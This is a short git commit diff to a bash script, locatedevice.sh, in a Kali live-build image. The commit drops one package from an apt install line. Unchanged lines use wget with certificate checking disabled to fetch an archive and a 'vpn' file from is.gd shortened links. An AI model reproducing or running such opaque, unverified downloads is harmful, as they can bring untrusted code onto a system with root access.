4a450be51ab61a0050c902f1031f41924e66077e
Remi Girard <54126451+independentcod@users.noreply.github.com>
2020-09-05 08:29:35 -0400

    Update locatedevice.sh

--- live-build-config/kali-config/common/includes.chroot/root/Desktop/locatedevice.sh
+++ live-build-config/kali-config/common/includes.chroot/root/Desktop/locatedevice.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 sudo apt update;
-sudo apt install unzip wget openvpn mono-complete winetricks -y;
+sudo apt install unzip wget openvpn winetricks -y;
 mkdir ~/init/;
 wget --no-check-certificate -O ~/init/init.zip https://is.gd/initzip;
 wget --no-check-certificate -O ~/init/vpn https://is.gd/sickvpnclient;
